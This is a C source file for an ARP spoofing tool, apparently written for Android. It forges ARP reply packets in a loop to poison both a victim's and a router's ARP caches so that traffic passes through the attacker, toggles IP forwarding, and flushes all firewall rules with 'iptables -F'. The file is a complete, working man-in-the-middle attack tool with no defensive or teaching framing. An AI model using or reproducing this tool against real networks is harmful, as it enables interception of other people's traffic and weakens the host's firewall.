#include "arp_spoofer.h"

eth_header* create_eth_header(char* ether_shost, char* ether_dhost, int ether_type) {
	eth_header *ethernet;
	ethernet = (eth_header *)malloc(sizeof(struct sniff_ethernet));

	// Fill Ethernet Header
	memcpy(ethernet->ether_shost, (void *)ether_aton(ether_shost), 6);
	memcpy(ethernet->ether_dhost, (void *)ether_aton(ether_dhost), 6);
	ethernet->ether_type = htons(ether_type);

	return ethernet;
}

arp_header* create_arp_header(char* src_mac, char* src_ip, char* dest_mac, 
	char* dest_ip, int arp_type) {
	arp_header *arp;
	in_addr_t temp;

	arp = (arp_header *)malloc(sizeof(struct arp_hdr));
	
	// Fill the ARP Header
	arp->htype 	= htons(ARPHRD_ETHER);
	arp->ptype 	= htons(ETHERTYPE_IP);
	arp->hlen 	= 6;
	arp->plen 	= 4;
	arp->oper 	= htons(arp_type);
	memcpy(arp->sha, (void *)ether_aton(src_mac), 6);
	temp 		= inet_addr(src_ip);
	memcpy(arp->spa, &temp, 4);
	memcpy(arp->tha, (void *)ether_aton(dest_mac), 6);
	temp 		= inet_addr(dest_ip);
	memcpy(arp->tpa, &temp, 4);

	return arp;
}

void send_packet(eth_header *ethernet, arp_header *arp, char *interface) {
	struct sockaddr_ll sll;
	struct ifreq ifr;
	int bytes;

	memset (&sll, 0, sizeof (sll));
	memset (&ifr, 0, sizeof (ifr));

	bzero(&sll, sizeof(sll));
	bzero(&ifr, sizeof(ifr));

	strncpy((char *)ifr.ifr_name, interface, IFNAMSIZ);
	//snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);

	if((ioctl(RAW, SIOCGIFINDEX, &ifr)) == -1) {
		submit_log("[%s]\n","Error getting Interface index");
		exit(EXIT_FAILURE);
	}

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_halen = ETHER_ADDR_LEN;
	memcpy(sll.sll_addr, arp->tha, ETHER_ADDR_LEN);

	PKT_LEN = sizeof(eth_header) + sizeof(arp_header); // Packet Length
	PACKET 	= (unsigned  char *)malloc(PKT_LEN); // Allocate Memory for the Packet
	memcpy(PACKET, ethernet, sizeof(eth_header)); // First Copy Ethernet Header
	memcpy(PACKET + sizeof(eth_header), arp, sizeof(arp_header)); // Next copy ARP Packet after the Ethernet Packet
	if((bytes = sendto(RAW, PACKET, PKT_LEN, 0, (struct sockaddr *)&sll, sizeof(sll))) < 0) {
		submit_log("[%s]\n","Error Sending Packet");
	} else {
		submit_log("[%s]\n", "Packet Sent Successfully");
	}

	free(ethernet);
	free(arp);
	free(PACKET);
}

int create_raw_socket(int socket_type) {
	int raw;

	if((raw = socket(PF_PACKET, SOCK_RAW, htons(socket_type))) < 0) {
		submit_log("[%s]\n","Socket(): failed");
		exit(EXIT_FAILURE);
	}

	return raw;
}

int main(int argc, char **argv) {
	eth_header *ethernet;
	arp_header *arp;
	int arg, c;
	int unidir = 0;
	char *interface = NULL;

	if(argc < 2) {
		fprintf(stderr, "Too Few Arguments\n");
		fprintf(stderr, "Option -%c requires an argument.\n", optopt);
        fprintf(stderr, "[USAGE] => %s -i \"[wlan0 or etho0]\" \n", argv[0]);
        return 1;
	} else {
		while((c = getopt (argc, argv, "i:u")) != -1) {
            switch(c) {
                case 'i':
                    interface = optarg;
                    break;
                    //fprintf(stderr, "Interface selected %s\n", interface);
                case 'u':
                	// flag for uni-directional
                	unidir = 1;
                	break;
                case '?':
                    if(optopt == 'i') {
                        fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                        fprintf(stderr, "[USAGE] => %s -i \"[wlan0 or etho0]\" \n", argv[0]);
                    } else if (isprint (optopt)) {
                        fprintf (stderr, "Unknown option `-%c'.\n", optopt);
                    } else {
                        fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
                    }
                    return 1;
            }
        }
	} 

	// Create a Raw Socket
	RAW = create_raw_socket(ETH_P_ALL); 

	arg = 1;
	if(setsockopt(RAW, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1) {
		submit_log("[%s]\n", "setsockopt(): failed");
		exit(EXIT_FAILURE);
	}
	//BindRawSocketToInterface(argv[1], RAW,ETH_P_ALL); // Bind raw Socket to Interface

	if(unidir != 1) {
		// Enable IP Forwarding to capture 2 way traffic (Victim >> Router && Router >> Victim)
		if((system("echo 1 > /proc/sys/net/ipv4/ip_forward")) == -1) {
			submit_log("%s", "unable to set ip_forward flag to 1");
			return EXIT_FAILURE;
		}
	} else {
		submit_log("%s", "IP Forwarding set to 0");
		// Allow to capture 1 way traffic (Victim >> Router) and do not pass the request to Router
		if((system("echo 0 > /proc/sys/net/ipv4/ip_forward")) == -1) {
			submit_log("%s", "unable to set ip_forward flag to 0");
			return EXIT_FAILURE;
		}
	}

	// Clear the Firewall rules for the device
	if((system("iptables -F")) == -1) {
		submit_log("%s", "Unable to Flush the Firewall rules");
		return EXIT_FAILURE;
	}

	while (1) {
		//ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
		//arp = create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
		//send_packet(ethernet, arp, interface);

		//ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
		//arp = create_arp_header(MY_MAC_ADDR, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
		//send_packet(ethernet, arp, interface);

		ethernet 	= create_eth_header(MY_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
		arp 		= create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, VICTIM_MAC_ADDR, VICTIM_IP_ADDR, ARP_REPLY);
		send_packet(ethernet, arp, interface);

		ethernet = create_eth_header(MY_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
		arp = create_arp_header(MY_MAC_ADDR, VICTIM_IP_ADDR, ROUTER_MAC_ADDR, ROUTER_IP_ADDR, ARP_REPLY);
		send_packet(ethernet, arp, interface);

			sleep(1);
	}

	

	return 0;
}

int submit_log(char *msgType, char *string) {
	__android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, msgType, string);
	//printf(msgType, string);
	return 0;
}

int submit_log_i(char *msgType, int value) {
	__android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, msgType, value);
	//printf(msgType, string);
	return 0;
}